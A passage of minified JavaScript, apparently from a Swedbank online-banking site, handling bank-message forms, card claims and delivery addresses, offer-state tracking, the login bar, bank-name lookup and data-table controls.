cityOrCounty=container.find("#cityOrCountyId"),countryCode=container.find("#countryCodeId"),index=container.find("#indexId"),address=container.find("#addressId");jQuery.inArray(container.find("#cardsToReport").val(),parameters.cardsWithDeliveryAbroadReminder)>-1?(cityOrCounty.data("cityorcounty",cityOrCounty.val()).val(""),countryCode.data("countrycode",countryCode.val()).val(""),index.data("index",index.val()).val(""),address.data("address",countryCode.val()).val("")):(cityOrCounty.val(cityOrCounty.data("cityorcounty")),countryCode.val(countryCode.data("countrycode")),index.val(index.data("index")),address.val(address.data("address")))},bankMessages.initAddressType=function(){container.find("input[name=addressType]:radio").length>0&&("LT"===parameters.country&&container.find("#branchNameId").change((function(){container.find("#branchNameId").val()===parameters.viaPostBranch?["cityOrCountyId","indexId","addressId"].each((function(element){container.find("#"+element).prop("disabled",!1)})):["cityOrCountyId","indexId","addressId"].each((function(element){container.find("#"+element).prop("disabled",!0)}))})),container.find("input[name=addressType]:radio").on("change",(function(){bankMessages.chooseCardDeliveryAddress(jQuery(this).val())})),bankMessages.chooseCardDeliveryAddress(container.find("input[name=addressType]:radio:checked").val()))},bankMessages.initCardHolders=function(){"LV"===parameters.country&&container.find("#cardUser.autocomplete").length>0&&Controls.executeControl(container.attr("id"),"BankMessagesControl",{activeCards:"true",type:parameters.type?parameters.type:container.find('select[name="messageType"]').val(),rendererType:"JSON"},{onSuccess:function(transport){bankMessages.hideContainers();var cardNumber=container.find("#cardNumber"),cardUser=container.find("#cardUser"),cardNumbers=transport.responseJSON.cards;if(!(cardNumbers.length<1)){cardNumber.on("change",(function(){cardUser.val(cardNumbers.filter((function(card){return card.id===cardNumber.val()})).first().holder)}));var filtered=cardNumbers.filter((function(card){return card.id===cardNumber.val()})).first();filtered&&cardUser.val(filtered.holder)}}})},bankMessages.hideContainers=function(){exceptionsContainer&&(exceptionsContainer.text(""),exceptionsContainer.hide())},bankMessages.chooseContractNumber=function(){Controls.executeControl(container.attr("id"),"BankMessagesControl",{chooseLoanContractNumber:"true",accountNumber:container.find("#account_number").val(),type:parameters.type?parameters.type:container.find('select[name="messageType"]').val(),rendererType:"JSON"},{onSuccess:function(transport){bankMessages.hideContainers();var json=transport.responseJSON;json.contracts=json.contracts||[];var field,contracts=json.contracts;1===contracts.length?field=jQuery('<input type="text" id="loanContractNumber" value="'+contracts[0]+'" size="15" name="loanContractNumber" maxlength= "15" class="textfield" readonly="readonly"/>'):contracts.length>1?(field=jQuery('<select id="loanContractNumber" name="loanContractNumber" class="selector-header"></select>'),contracts.forEach((function(contract){var option=jQuery('<option value="'+contract+'">'+contract+"</option>");contract===loanContractNumber&&option.prop("selected","selected"),field.append(option)}))):field=jQuery('<input type="text" id="loanContractNumber" value="" size="15" name="loanContractNumber" maxlength= "15" class="textfield"/>'),container.find("#loanContractNumber").parent().html(field)}})},bankMessages.initLoanContractNumbers=function(){"LT"===parameters.country&&container.find("#loanContractNumber.autocomplete").length>0&&(bankMessages.chooseContractNumber(),container.find("#account_number").on("change",(function(){bankMessages.chooseContractNumber()})))},bankMessages.initCardClaims=function(){if("LV"===parameters.country){var contactToMerchantLabel=container.find("#contactToMerchantLabel");container.find("input[name=merchantTransactions]").change((function(){contactToMerchantLabel.toggle()}));var reasonSelect=container.find("select[name=claimReason]");if(0!==reasonSelect.length){var reasonIdx=container.find('input[name="cardClaimReasonIdx"]'),select=container.find("select[name=claimReason]");select.off("change"),select.change((function(){container.find(".card-claim-control").hide(),reasonIdx.val(reasonSelect[0].selectedIndex);var reasonClasz=reasonSelect.find("option:selected").data("reason");reasonClasz&&container.find("."+reasonClasz).each((function(){var zis=jQuery(this);if(zis.hasClass("switchable1")||zis.hasClass("switchable2")||zis.show(),"services-not-provided-reason"===reasonClasz){var sel=zis.find('select[name="cardholderAttemptedToSolveBy"]');sel.off("change"),sel.change((function(){var switchable2=container.find(".card-claim-control.services-not-provided-reason.switchable2");jQuery(this).find("option:selected").data("switchable")?switchable2.show():switchable2.hide()})),sel.val(sel.find("option:first").val()).change();var dateField=container.find(".card-claim-control.services-not-provided-reason.expected-deliv-date-input"),dateInput=jQuery(dateField[1]).find('input[name="expectedDeliveryDate_date"]'),chk=zis.find('input[name="deliveryDateUnknown"]');chk.off("change");var switchable1=container.find(".card-claim-control.services-not-provided-reason.switchable1"),dt=container.find(".card-claim-control.services-not-provided-reason.deliv-date-unknown-dt");chk.change((function(){this.checked?(switchable1.show(),dateField.hide(),dateInput.val(""),dt[0].label=dateField[0].label,container.find("#deliveryDateUnknownValue").removeAttr("disabled")):(switchable1.hide(),dateField.show(),dt[0].label="",container.find("#deliveryDateUnknownValue").attr("disabled","disabled"))})),dateInput.val(""),chk.attr("checked",!1),chk.change()}}))})),select.change()}}},bankMessages.initMessageTypeChange=function(){container.find('select[name="messageType"]').on("change",(function(){bankMessages.changeType(jQuery(this).val())}))},bankMessages.changeType=function(type){Controls.executeControl(container.attr("id"),"BankMessagesControl",{changeType:"true",messageType:type},{onSuccess:function(transport){ErrorMessage.clear(),bankMessages.hideContainers();var $content=jQuery(transport.responseText).unwrap("<content>");container.find(".container-body").html($content),Swedbank.Forms.enhanceDateFields(),container.find(".phone-field").addDialCodePicker(),bankMessages.initAddressType(),bankMessages.initSendButton(),bankMessages.initCardsNotDelivered(),bankMessages.initCardHolders(),bankMessages.initChooseCards(),bankMessages.initLoanContractNumbers(),bankMessages.initCardClaims(),bankMessages.initReportOfPaymentCardTransactions(),bankMessages.removeAllMessages("bankMessagesMessages"),container.trigger("changeType.BankMessageControl",{container:container});new SharedComponents.EventObserver({name:"change"}).observe(container[0]),container[0].addEventListener("limits-changed",(e=>resolveElementRequireability()))}})},bankMessages.initSendButton=function(){container.find("div.container-body").find("#B_send").on("click",(function(){(function validateBankMessageUI(){const reasonType=document.getElementById("messageTypeValidate");let validatorResult=!0;if(validatorResult=validateUI(reasonType.options[reasonType.selectedIndex].value,resolveElementRequireability,void 0,validatorResult),validatorResult)bankMessages.removeAllMessages("bankMessagesMessages");else{var label=Swedbank.Labels.get("error_invalid_input");bankMessages.addMessages("bankMessagesMessages",[{severity:"ERROR",label:label}],null,bankMessages)}return validatorResult})()&&(this.disabled=!0,bankMessages.checkFeesAgreement(this)&&bankMessages.send(this))}))},bankMessages.addMessages=(uiMessagesId,messages,timeout,bankMessages)=>{if(Array.isArray(messages)&&messages.length>0){bankMessages.removeAllMessages(uiMessagesId);let messageNodes=messages.map((message=>UI.createElement({tagName:"ui-message",attributes:{type:message.severity.toLowerCase()},children:[message.label]}))),uiMessages=document.querySelector("ui-messagebox[key="+uiMessagesId+"]");UI.insertElements(uiMessages,messageNodes),timeout&&setTimeout((()=>messageNodes.forEach((node=>node.parentElement.removeChild(node)))),timeout)}},bankMessages.removeAllMessages=uiMessagesId=>{let uiMessages=document.querySelector("ui-messagebox[key="+uiMessagesId+"]");uiMessages&&uiMessages.removeAllMessages()},bankMessages.checkFeesAgreement=function(button){if(document.getElementById("fees-from-same-account-agreement-error")){var $effsae=document.getElementById("fees-from-same-account-agreement-error");UI.hide($effsae);var $ffsa=document.getElementById("fees-from-same-account-agreement");return $ffsa.length>0&&!$ffsa.is(":checked")?(UI.show($effsae),button.disabled=!1,!1):(UI.hide($effsae),!0)}return!0},bankMessages.send=function(button){button.disabled=!0,ErrorMessage.clear();var params={send:"true",type:parameters.type?parameters.type:container.find('select[name="messageType"]').val(),rendererType:"JSON"},fields=[];function handleErrors(json){json.message&&ErrorMessage.add(json.message),jQuery.each(json.errors,(function(index,error){error.message&&(error.type&&"error"!==error.type?"warning"===error.type&&WarningMessage.add(error.message):ErrorMessage.add(error.message))}))}jQuery.each(["input","textarea","select"],(function(i,element){container.find(".container-body "+element).each((function(i,field){"radio"===jQuery(field).attr("type")?jQuery(field).is(":checked")&&(params[field.name]=jQuery(field).val(),fields.push(jQuery(field))):(params[field.name]="checkbox"===jQuery(field).attr("type")?jQuery(field).prop("checked"):jQuery(field).val(),fields.push(jQuery(field)))}))})),Controls.executeControl(container.attr("id"),"BankMessagesControl",params,{onSuccess:function(transport){bankMessages.hideContainers();var json=transport.responseJSON?transport.responseJSON:transport;if(json.errors&&json.errors.size()>0)return handleErrors(json),void(button.disabled=!1);exceptionsContainer.hide();const sendEvent=new CustomEvent("send.BankMessageControl",{detail:{messageType:container.find('select[name="messageType"]').val()}});container[0].dispatchEvent(sendEvent)},onFailure:function(){button.disabled=!1}})},bankMessages.initChooseCards=function(){container.find("#account_number.autocomplete").length>0&&(bankMessages.chooseCards(),container.find("#account_number.autocomplete").on("change",(function(){bankMessages.chooseCards()})))},bankMessages.chooseCards=function(){Controls.executeControl(container.attr("id"),"BankMessagesControl",{chooseCards:"true",accountId:container.find("#account_number").val(),rendererType:"JSON"},{onSuccess:function(transport){bankMessages.hideContainers();var cards=transport.responseJSON.cards,field="";if(1===cards.length){var html='<input type="text" id="card_number" value="'+cards[0].id;html+='" size="16" name="card_number" maxlength="16" class="textfield" readonly="readonly"/>',field=jQuery(html)}else if(cards.length>1)field=jQuery('<select id="card_number" name="card_number" class="selector-header"></select>'),cards.each((function(card){var option=jQuery('<option value="'+card.id+'">'+card.id+" "+card.holder+"</option>");field.append(option)}));else{html='<input type="text" id="card_number" value="" size="16" name="card_number" maxlength="16" class="textfield"/>';field=jQuery(html)}jQuery("#card_number").parent().html(field)}})},bankMessages.chooseCardDeliveryAddress=function(type){"G"===type&&(container.find(".branches-row").hide(),container.find(".country-row, .city-row, .index-row, .street-row").show(),"LT"===parameters.country&&(container.find(".cards-deliverable-abroad input").prop("disabled",!1),container.find("tr:has(td.cards-deliverable-abroad)").show(),container.find(".not-issued-cards input").prop("disabled",!0),container.find("tr:has(td.not-issued-cards)").hide())),"L"===type&&(container.find(".branches-row").show(),container.find(".country-row, .city-row, .index-row, .street-row").hide(),"LT"===parameters.country&&(container.find(".cards-deliverable-abroad input").prop("disabled",!0),container.find("tr:has(td.cards-deliverable-abroad)").hide(),container.find(".not-issued-cards input").prop("disabled",!1),container.find("tr:has(td.not-issued-cards)").show())),["countryCodeId","cityOrCountyId","indexId","addressId"].each((function(element){"LT"===parameters.country?container.find("#"+element).prop("disabled","L"===type&&container.find("#branchNameId").val()!==parameters.viaPostBranch):container.find("#"+element).prop("disabled","L"===type)})),container.find("#branchNameId").prop("disabled","G"===type)},bankMessages.initReportOfPaymentCardTransactions=function(){var $reportChannelSelect=jQuery("#reportChannel"),$reportCheckboxes=jQuery("#reportCheckboxContainer :checkbox");$reportChannelSelect.on("change",(function(){$reportCheckboxes.each((function(index,checkbox){var $checkbox=jQuery(checkbox),$checkboxRow=$checkbox.closest("li"),reportChannel=$checkboxRow.data("report-channel");$checkbox.prop("checked",!1),$checkboxRow.toggle(void 0===reportChannel||reportChannel===$reportChannelSelect.val())}))})).trigger("change")},jQuery((function(){bankMessages.init()})),bankMessages},Swedbank.BankMessages=Swedbank.BankMessages||{},Swedbank.BankMessages.handleBankMessageSubmit=function(isPrivate){document.querySelector("#BankMessagesControl-general").addEventListener("send.BankMessageControl",(function(e){adobeFlowBankMessageSendComplete(),navigateTo(isPrivate?"private.home.important.communication.messages.thankyou":"business.useful.bank.communication.messages.thankyou","messageType",e.detail.messageType)}))},window.BankOffers=function(){var _saveOffersInProgress=[],_saveOptionsInProgress={},_savedOffers={},_errorTypes={DUPLICATE_REQUEST:"duplicate_request",DUPLICATE_UPDATE:"duplicate_update",SAVE_PROBLEMS:"save_problems",LOAD_PROBLEMS:"load_problems"},privatePageId="business.useful.offerdetail",businessPageId="private.home.important.offers.offerdetail",isOfferDeliveryActive=!0;function changeOffersDelivered(offers){changeOfferDeliveryState(offers,"DELIVERED")}function changeOfferDeliveryState(offers,state){"DELIVERED"===state||"GIVEN"===state?function sendAjaxStateUpdate(offers,state){if(!isOfferDeliveryActive)return void console.log("Offer delivery is not active");var action={DELIVERED:"stateDelivered",GIVEN:"stateGiven"}[state],idParameter={DELIVERED:"collateralIdList",GIVEN:"collateralObjectId"}[state],validOfferIds=function getValidOfferIds(offers,state){var sessionKey=state+"_ID",used=function getStoredUsers(sessionKey){var value=Swedbank.sessionStorage.get(sessionKey),stored=value?value.trim():"";return stored&&stored.split(",")||[]}(sessionKey),valid=[];return offers.forEach((function(offerId){var id=(offerId+"").replace(/^0+/,"");parseInt(id)&&parseInt(id)>0&&-1===used.indexOf(id+"")&&(used.push(id),valid.push(id))})),function setStoredUsers(sessionKey,used){Swedbank.sessionStorage.get(sessionKey,used.join(","))}(sessionKey,used),valid}(offers,state);if(action&&idParameter&&validOfferIds.length){var options={pageId:getOfferDetailsPage(),field1:action,value1:"true"};options[idParameter]=validOfferIds,makeAjaxRequest(document.mainForm,options)}}(offers,state):console.error("offer delivery state is not supported: "+state)}function getOfferDetailsPage(){return Swedbank&&Swedbank.Navigation&&Swedbank.Navigation.isBusiness&&Swedbank.Navigation.isBusiness()?privatePageId:businessPageId}return{ErrorTypes:_errorTypes,saveOffer:function saveOffer(options,callback){if((options=options||{}).pageId=options.pageId||businessPageId,options.field1=options.field1||"answer_bank",options.value1=options.value1||"true",!options.id)throw new Error("bankOfferUniqueId not defined");_saveOptionsInProgress[options]||_savedOffers[options.id]||(_saveOptionsInProgress[options]=!0,_saveOffersInProgress.push((function(){function onRequestStopped(response){if("function"==typeof callback){var error=null;200==response.status&&response.responseJSON?response.responseJSON.exception||response.responseJSON.errors?error=response.responseJSON.exception||response.responseJSON.errors:_savedOffers[options.id]=!0:error=_errorTypes.SAVE_PROBLEMS,delete _saveOptionsInProgress[options],callback.apply(this,Array.prototype.slice.call([error].concat(arguments)))}_saveOffersInProgress.shift(),_saveOffersInProgress[0]&&_saveOffersInProgress[0].apply(null,[])}options.forceAjax=!0,makeAjaxRequest(document.mainForm,options,onRequestStopped).fail(onRequestStopped)})),1===_saveOffersInProgress.length&&_saveOffersInProgress[0].apply(null,[]))},saveOfferWithStatus:function saveOfferWithStatus(id,status,callback){var options={field1:"answer_bank",value1:"true",field2:"answerType",value2:status,id:id};return this.saveOffer(options,callback)},saveBusinessOffer:function saveBusinessOffer(options,callback){return options.pageId=options.pageId||privatePageId,this.saveOffer(options,callback)},saveBusinessOfferWithStatus:function saveBusinessOfferWithStatus(id,status,callback){var options={field1:"answer_bank",value1:"true",field2:"answerType",value2:status,id:id};return this.saveBusinessOffer(options,callback)},changeOffersDelivered:changeOffersDelivered,changeOffersGiven:function changeOffersGiven(offer){changeOfferDeliveryState([offer],"GIVEN")},initializeOfferGiven:function initializeOfferGiven(seconds){seconds=Math.abs(seconds||10),Swedbank&&Swedbank.isAuthenticated&&isOfferDeliveryActive&&setTimeout((function(){var offers=[];jQuery(".do-delivery-state").attr("data-collateral",(function(index,value){value&&offers.push(value)})),changeOffersDelivered(offers)}),1e3*seconds)},clearOfferStorage:function clearOfferStorage(){Swedbank.sessionStorage.clear()},setOfferDeliveryActive:function setOfferDeliveryActive(active){isOfferDeliveryActive=active}}}(),Swedbank.PageLoad.onFirst((function($){$("body").on("click",".ad-offer .ad, .ad-offer .ad a",(function(e){Swedbank&&Swedbank.isAuthenticated&&BankOffers.changeOffersGiven($(this).closest(".ad-offer").find(".do-delivery-state").data("collateral"))}))})),UI.whenDOMReady((function(){function buildLoginToggle(container){container&&UI.rebuildChildren(loginToggleContainer,window.matchMedia("(max-width: 1023px)").matches?[{tagName:"ui-navtoggle",attributes:{id:"login-button",for:"nav-mobile-login",group:"navigation",layout:"default"},children:[{tagName:"ui-icon",attributes:{glyph:"profile",bgcolor:"default"}}]}]:[{tagName:"ui-navtoggle",attributes:{id:"login-button",for:"nav-desktop-login",group:"navigation",layout:"link"},children:[{tagName:"ui-caption",children:[{tagName:"ui-icon",attributes:{glyph:Swedbank.isAuthenticated?"log-out":"log-in",color:"orange"}},Swedbank.isAuthenticated?Swedbank.Labels("exit"):Swedbank.Labels("loginButton")]}]}])}function buildSPOEBar(){if(!Swedbank.isHeaderRedesign&&(Swedbank.isAuthenticated&&Swedbank.Navigation.isBusiness()&&Swedbank.User&&Swedbank.User.customers.length)){var isMobile=window.matchMedia("screen and (max-width: 1023px)").matches,spoeParent=isMobile?document.querySelector("ui-navlist-menu .nav-communication-content"):document.querySelector(".page-header__wrapper"),refNode=isMobile?spoeParent.firstChild:spoeParent.querySelector(".settings"),spoeBar=document.querySelector("spoe-bar");spoeBar?spoeBar.parentNode!==spoeParent&&spoeBar.parentNode.removeChild(spoeBar):spoeBar=document.createElement("spoe-bar"),spoeParent.insertBefore(spoeBar,refNode),UI.updateElement(spoeBar,{classList:{"nav-communication-section":isMobile}}),spoeBar.querySelectorAll("ui-field").forEach((function(field){UI.setAttributes(field,{layout:!isMobile&&"inline"})}))}}var loginToggleContainer=document.querySelector(".page-header .login-button");if(buildLoginToggle(loginToggleContainer),buildSPOEBar(),window.matchMedia("(max-width: 1023px)").addListener((function(){buildLoginToggle(loginToggleContainer)})),Swedbank.isHeaderRedesign||window.matchMedia("screen and (max-width: 1023px)").addListener((function(){buildSPOEBar()})),Swedbank.AdobeTracking.isTrackingEnabled()){let navSearchButton=document.getElementById("nav-search-button");navSearchButton&&navSearchButton.addEventListener("click",(function(){_dl.flow={name:"internal-search",category:"search",type:"search",behaviourType:"selfservice",step:"step0",stepDescription:"open-search",productArray:[],formErrors:[],searchKeyword:"",searchViewedResult:"",searchResultType:"",event:{formView:"1"}},_dl.page.pageName="web"+Swedbank.Navigation.getBasePath()+"/"+_dl.flow.step+"-"+_dl.flow.stepDescription}))}}));var LoginBar=function(options){this.initialized=!1,this.options={},this.toggled=!1,this.options={elementId:"loginbar"},this.options=Object.assign(this.options,options||{}),this.loginbarElement=document.getElementById(this.options.elementId)};LoginBar.prototype.isExpanded=function(){return this.loginbarElement?.classList.contains("-expanded")},LoginBar.prototype.isHidden=function(){return this.loginbarElement?.classList.contains("-hidden")},LoginBar.prototype.setLoginVisible=function(){this.loginbarElement?.classList.add("-login-visible")},LoginBar.prototype.init=function(){this.initialized=!0,this.show()},LoginBar.prototype.updateHeaderLoginButton=function(active){if(!document.documentElement.classList.contains("redesign"))return;const loginButton=document.getElementById("page-header__login");loginButton.classList.toggle("-activated",active),loginButton.querySelector("ui-icon").glyph=Swedbank.isAuthenticated?"log-out":"log-in"},LoginBar.prototype.handleClickOutside=function(e){const loginBar=e.target.closest(".login-inner"),toggle=e.target.closest("ui-navtoggle")&&!document.documentElement.classList.contains("redesign"),cookieConsent=e.target.closest("ui-cookie-consent"),modal=e.target.closest("ui-modal");!document.documentElement.classList.contains("-navtoggle-expanded")||loginBar||toggle||cookieConsent||modal||(LoginBar.prototype.updateHeaderLoginButton(!1),document.removeEventListener("click",Hansa.loginbar.handleClickOutside),Hansa.loginbar.hide())},LoginBar.prototype.show=function(){if(this.loginbarElement){this.toggled&&this.loginbarElement.classList.add("-toggled"),this.loginbarElement.classList.remove("-hidden"),this.loginbarElement.classList.add("-expanded");var toggle=document.getElementById("login-button");toggle&&(toggle.active=!0),LoginBar.prototype.updateHeaderLoginButton(!0),SharedComponents.helpers.nextFrame((function(){window.matchMedia("(max-width: 1023px)").matches&&document.documentElement.classList.add("-navtoggle-expanded"),document.addEventListener("click",LoginBar.prototype.handleClickOutside)}))}},LoginBar.prototype.hide=function(forced){var toggle=document.getElementById("login-button");toggle&&(toggle.active=!1),window.matchMedia("(max-width: 1023px)").matches&&document.documentElement.classList.remove("-navtoggle-expanded"),document.removeEventListener("click",LoginBar.prototype.handleClickOutside),this.loginbarElement&&(this.loginbarElement.classList.add("-hidden"),(forced=forced||!1)&&this.loginbarElement.classList.remove("-expanded"))},LoginBar.prototype.forcedLoginToggle=function(){var isDesktop=window.matchMedia("(min-width: 1024px)").matches;this.toggled=!0,isDesktop&&UI.whenDOMReady(function(){var mainMenu=document.querySelector("ui-nav#nav-main");mainMenu&&mainMenu.close();var loginWidgetTabs=this.loginbarElement?.querySelector("login-widget ui-tabs"),activeView=loginWidgetTabs&&loginWidgetTabs.views.getActiveView();activeView&&UI.focusInteractiveElement(activeView)}.bind(this)),window.scrollTo(0,0),isDesktop&&this.isExpanded()&&this.loginbarElement&&this.loginbarElement.classList.toggle("is-animated"),this.show()};var LoginTypes={CERTIFICATE:"CERTIFICATE",MOBILE_ID:"MOBILE_ID",PIN_CALCULATOR:"PIN_CALCULATOR",SMART_ID:"SMART_ID"};function getApplicationName(){return null!=document.navForm.pageId&&document.navForm.pageId.value.indexOf(".")>-1?document.navForm.pageId.value.substring(0,document.navForm.pageId.value.indexOf(".")):null!=document.navForm.pageId&&document.navForm.pageId.value.length>0?document.navForm.pageId.value:"unknown"}UI.whenDOMReady((()=>{if(document.documentElement.classList.contains("redesign"))return;const loginBarToggle=document.getElementById("login-button"),loginWidget=document.querySelector("login-widget");loginBarToggle&&Hansa.loginbar&&Hansa.loginbar.loginbarElement&&Hansa.loginbar.isExpanded()&&(loginBarToggle.active=!0);const focusHandleOnTabChange=event=>{if(event instanceof CustomEvent){const view=event.target.getActiveView();UI.focusInteractiveElement(view.firstElementChild)}};loginWidget&&(loginWidget.tabs.views.addEventListener("change",focusHandleOnTabChange),loginWidget.tabs.views.dispatchEvent(new CustomEvent("change"))),SharedComponents.eventBus.addEventListener("menu-toggle",(function(e){if(e.detail)switch(e.detail.for){case"nav-mobile-login":e.detail.active?Hansa.loginbar.initialized?Hansa.loginbar.show():Hansa.loginbar.init():Hansa.loginbar.hide();break;case"nav-desktop-login":Swedbank.isAuthenticated?logout():Hansa.loginbar.forcedLoginToggle();break;default:window.matchMedia("(max-width: 1023px)").matches&&Hansa.loginbar&&Hansa.loginbar.hide()}})),window.matchMedia("(max-width: 1023px)").addListener((function(){const mobileToggle=document.querySelector("ui-navtoggle[for=nav-mobile-login]");Hansa.loginbar&&mobileToggle&&window.matchMedia("(max-width: 1023px)").matches&&SharedComponents.eventBus.dispatchCustomEvent("menu-toggle",{active:Hansa.loginbar.isExpanded(),for:"nav-mobile-login",group:"navigation"})}))})),UI.whenDOMReady((async()=>{if(!document.documentElement.classList.contains("redesign"))return;const modalController=document.querySelector("ui-modal-controller"),topModal=await new Promise((resolve=>{setTimeout((()=>{resolve(modalController.getActiveTopModalWindow())}))}));let isTopModalActive=topModal?.isActive();const loginWidget=document.querySelector("login-widget"),loginButton=document.getElementById("page-header__login");LoginBar.prototype.updateHeaderLoginButton(!!Hansa.loginbar&&Hansa.loginbar.loginbarElement&&Hansa.loginbar.isExpanded());const focusHandleOnTabChange=event=>{if(event instanceof CustomEvent){const view=event.target.getActiveView();UI.focusInteractiveElement(view.firstElementChild)}},sendLoginOverlayToFDP=active=>{if(!Swedbank.FDPAdapter.isFDPEnabled()||isTopModalActive)return;const fdpAdapter=Swedbank.FDPAdapter.getInstance(),isActive=active&&Hansa.loginbar.isExpanded();fdpAdapter.postToParentApp({type:isActive?Swedbank.FDPAdapter.messageTypes.OverlayOpened:Swedbank.FDPAdapter.messageTypes.OverlayClosed,payload:{animate:!1,blockScroll:!0,closable:!0,partial:!0}})};SharedComponents.eventBus.addEventListener("modal-close-enter",(()=>{if(!Hansa.loginbar)return;const isLoginIsActiveOnMobile=Hansa.loginbar.isExpanded()&&window.matchMedia("(max-width: 1023.98px)").matches;isTopModalActive=!1,isLoginIsActiveOnMobile&&sendLoginOverlayToFDP(!0)})),SharedComponents.eventBus.addEventListener("modal-open-enter",(()=>{isTopModalActive=!0})),loginWidget&&(loginWidget.tabs.views.addEventListener("change",focusHandleOnTabChange),loginWidget.tabs.views.dispatchEvent(new CustomEvent("change")));const toggleMobileLoginWidget=active=>{LoginBar.prototype.updateHeaderLoginButton(active),active?Hansa.loginbar.initialized?Hansa.loginbar.show():Hansa.loginbar.init():Hansa.loginbar.hide(),sendLoginOverlayToFDP(active)};loginButton&&loginButton.addEventListener("click",(()=>{SharedComponents.eventBus.dispatchCustomEvent("menu-toggle",{active:!1}),Swedbank.isAuthenticated?logout():window.matchMedia("(max-width: 1023.98px)").matches?toggleMobileLoginWidget(Hansa.loginbar.isHidden()):Hansa.loginbar.forcedLoginToggle()})),window.matchMedia("(max-width: 1023.98px)").addListener((()=>{const isMobile=window.matchMedia("(max-width: 1023.98px)").matches;if(Hansa.loginbar&&isMobile)return SharedComponents.eventBus.dispatchCustomEvent("menu-toggle",{active:!1}),void toggleMobileLoginWidget(Hansa.loginbar.isExpanded()&&!Hansa.loginbar.isHidden());Hansa.loginbar&&!isMobile&&toggleMobileLoginWidget(Hansa.loginbar.loginbarElement?.classList.contains("-login-visible"));const loginButton=document.getElementById("page-header__login");loginButton.classList.toggle("-activated",!!Hansa.loginbar&&Hansa.loginbar.isExpanded()),loginButton.querySelector("ui-caption").pos=isMobile?"left":"right",loginButton.querySelector("ui-icon").glyph=Swedbank.isAuthenticated?"log-out":"log-in"}))}));var BankNameResolver=function(accountNumberField,bankNameContainer,onEndCallback,onStartCallback,onInvalidAccountCallback){var self=this;loadingMessage='<ins class="loader"></ins>',this.onEndCallback=onEndCallback,this.onStartCallback=onStartCallback,this.onInvalidAccountCallback=onInvalidAccountCallback,this.accountNumberField=accountNumberFieldToJQuery(accountNumberField),this.bankNameContainer=jQuery("#"+bankNameContainer),this.bankNameErrorContainer=jQuery('<div class="validation-message">').insertAfter(this.bankNameContainer),this.skipErrorMessage=!1,this.accountNumberField.on("change",(function(){self.getBankNameAjax()}))};function accountNumberFieldToJQuery(accountNumberField){var split=accountNumberField.split(".");return split.length>1?jQuery("#"+split[0]+"\\."+split[1]):null}BankNameResolver.prototype.showErrorMessage=function(){this.bankNameErrorContainer.text(Swedbank.Labels("invalidAccountNumberInserted")).show(),this.bankNameErrorContainer.parent().addClass("validation-error")},BankNameResolver.prototype.hideErrorMessage=function(){this.bankNameErrorContainer.hide(),this.bankNameErrorContainer.parent().removeClass("validation-error")},BankNameResolver.prototype.updateBankName=function(bank){bank&&bank.bankName?(this.bankNameContainer.html(bank.bankName),this.hideErrorMessage()):(this.bankNameContainer.html(""),this.showErrorMessage()),this.onEndCallback&&this.onEndCallback(bank)},BankNameResolver.prototype.getBankNameAjax=function(){this.bankNameContainer.html(this.loadingMessage),AccountNumber.formatField(this.accountNumberField);var account=this.accountNumberField.val();if(""===account)return this.bankNameContainer.html(""),this.hideErrorMessage(),!1;if(!AccountNumber.isValid(account))return this.onInvalidAccountCallback&&this.onInvalidAccountCallback(),this.bankNameContainer.html(""),this.skipErrorMessage||this.showErrorMessage(),!1;this.onStartCallback&&this.onStartCallback();var that=this;makeAjaxRequest(document.mainForm,{pageId:"shared.ajaxResponse",getBank:!0,accountNumber:account},(function(result){return that.updateBankName(result.responseJSON),!1}))};var DataTable={};!function($){function doAction(id,type,param,action,isAjax){var $wrapper=$("#complextable-"+id);function addTableParams(adder){$wrapper.find('input[type="text"]').each((function(){adder(id+"|filter",$(this).data("filter")+"|"+$(this).val())})),$wrapper.find(":checkbox:checked").each((function(){adder($(this).attr("name"),$(this).val())}))}if(isAjax){var params={};action&&(params[action]=!0),params[id+"|"+type]=param,addTableParams((function(name,value){params[name]=params[name]||[],params[name].push(value)})),makeAjaxRequest(document.mainForm,params,(function(response){$wrapper.html(response.responseText)}))}else{var $form=Swedbank.Forms.generateAdditionalForm(id+"Form",{});addTableParams((function(name,value){$('<input type="hidden"/>').attr("name",name).val(value).appendTo($form)})),runLinkAction($form[0],"",id+"|"+type,param,action,"true")}}DataTable.sort=function(id,param,action,isAjax){doAction(id,"sort",param,action,isAjax)},DataTable.pageSize=function(id,param,action,isAjax){doAction(id,"pageSize",param,action,isAjax)},DataTable.pageNumber=function(id,param,action,isAjax){doAction(id,"pageNumber",param,action,isAjax)},DataTable.filter=function(id,action,isAjax){doAction(id,"filter","true",action,isAjax)},DataTable.initiateCheckBoxSelection=function(){$("html").on("click","td :checkbox",(function(){DataTable.refreshSelectAllCheckbox($(this).closest("table"))})),$("html").on("click","#select_all",(function(){DataTable.selectAll(this)}))},DataTable.selectAll=function(source){var toSelect=source.checked;$(source).closest("table").find("td :checkbox").each((function(){this.checked!==toSelect&&(this.checked=toSelect,$(this).trigger("change"))}))},DataTable.refreshSelectAllCheckbox=function(table){table.find("#select_all").prop("checked",!(table.find("td :checkbox").filter(":not(:checked)").length>0))},DataTable.autoAlign=function(){var $table=$(this),datatypes=[];$table.find("tr.titleRow th").each((function(){datatypes.push({type:"",count:0,detectType:function(value){var type=value?value.match(/^-?[\d\s]+([.,][\d\s]+)?([A-Z]{3})?$/)?"number":"text":void 0;this._updateType(type)},_updateType:function(newType){this._isTypeKnown()||(this.count++,this.type=newType)},_isTypeKnown:function(){return"text"==this.type||this.count>=3}})})),datatypes.allKnown=function(){for(var index=0;index<this.length;index++)if(!this[index]._isTypeKnown())return!1;return!0},datatypes.length&&($table.find("tr.dataRow").each((function(){if($(this).children("td").each((function(index){datatypes[index].detectType($.trim($(this).text()))})),datatypes.allKnown())return!1})),$table.find("tr").each((function(){$(this).children("td,th").each((function(index){$(this).addClass(datatypes[index].type)}))})))},DataTable.createExpandableTable=function(){$(".expandable-table").length&&$(".expandable-table:not(.table-expandable-enabled)").each((function(){var $table=$(this).addClass("table-expandable-enabled");if(!$table.is("#depositsProducts, #loansProducts, #cardsProducts, #currentAccounts, #leasingProducts, #pensionsProducts, #investmentsProducts, #investmentsAccounts")){var spanrows=0;$("tr",$table).each((function(){var $row=$(this);if($row.hasClass("extra-row")){var $td=$row.find("td");$td.attr("colspan",parseInt($td.attr("colspan"))+1)}else{if(1===$row.parents("table").length){$td="TH"===($td=$("th:last-child, td:last-child",$row).filter((function(){return $(this).closest("table").is($table)}))).prop("tagName")?$("<th/>"):$("<td/>").append('<span class="expander-button" />');var rowspan=$("td:first-child",$row).attr("rowspan");void 